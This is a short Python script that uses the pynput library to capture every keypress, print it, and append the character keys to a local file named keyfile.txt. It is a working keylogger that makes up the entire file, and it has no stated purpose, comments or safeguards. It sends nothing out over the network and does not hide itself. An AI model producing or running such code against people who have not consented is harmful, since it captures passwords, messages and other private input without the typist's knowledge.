from pynput import keyboard

def key_pressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as log_key:
        try:
            char = key.char
            log_key.write(char)
        except AttributeError:  
            print("Used a special key")
if __name__ == "__main__":
    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()
